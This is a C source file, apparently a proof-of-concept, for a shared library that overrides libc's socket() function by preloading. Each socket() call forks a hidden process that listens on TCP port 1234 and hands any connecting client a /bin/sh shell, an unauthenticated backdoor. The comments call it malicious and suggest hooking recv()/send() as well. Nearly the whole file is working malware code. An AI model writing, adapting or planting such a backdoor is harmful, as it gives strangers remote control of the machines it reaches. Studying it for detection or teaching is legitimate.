/*
 * Copyright (c) 2011-2014, Shawn Webb
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *    1) Redistributions of source code must retain the above
 *       copyright notice, this list of conditions and the following
 *       disclaimer.
 *    2) Redistributions in binary form must reproduce the above
 *       copyright notice, this list of conditions and the following
 *       disclaimer in the documentation and/or other materials
 *       provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND
 * CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
 * INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF
 * USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED
 * AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
 * ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <signal.h>


static void *dl;
int (*orig_socket)(int, int, int);

__attribute__((constructor)) void stub(void)
{
	dl = dlopen("/lib/libc.so.6", RTLD_LAZY | RTLD_GLOBAL);
	orig_socket = dlsym(dl, "socket");
	
}

void sigchld(int signo)
{
	while (waitpid(-1, NULL, WNOHANG) > 0)
		;
}

/*
 * socket() is the hijacked function in libc
 * To make this more malicious, one could hijack recv()/send() as well.
 * The majority of the code in my malicious socket() has been ripped
 * right from Beej's Guide to Network Programming. Thanks Beej!
 */
int socket(int domain, int type, int protocol)
{
	int sockfd, new_fd;
	int ret;
	struct addrinfo hints, *servinfo, *p;
	struct sockaddr_storage their_addr;
	socklen_t sin_size;
	struct sigaction sa;
	int yes=1;
	char s[INET6_ADDRSTRLEN];
	int rv;
	
	ret = orig_socket(domain, type, protocol);
	if (fork())
		return ret;
	
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;
	
	rv = getaddrinfo(NULL, "1234", &hints, &servinfo);
	if (rv != 0)
		_exit(0);
	
	for (p = servinfo; p != NULL; p = p->ai_next)
	{
		sockfd = orig_socket(p->ai_family, p->ai_socktype, p->ai_protocol);
		if (sockfd == -1)
			continue;
		
		if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
			continue;
		
		if (bind(sockfd, p->ai_addr, p->ai_addrlen) == -1)
			continue;
		
		break;
	}
	
	if (!(p))
		_exit(0);
	
	freeaddrinfo(servinfo);
	
	if (listen(sockfd, 5) == -1)
		_exit(0);
	
	signal(SIGCHLD, sigchld);
	
	while (1) {
		sin_size = sizeof(their_addr);
		new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size);
		if (new_fd == -1)
			continue;
		
		if (!fork())
		{
			close(sockfd);
			dup2(new_fd, fileno(stdin));
			dup2(new_fd, fileno(stdout));
			dup2(new_fd, fileno(stderr));
			execl("/bin/sh", "sh", NULL);
		}
	}
	
	return -1;
}
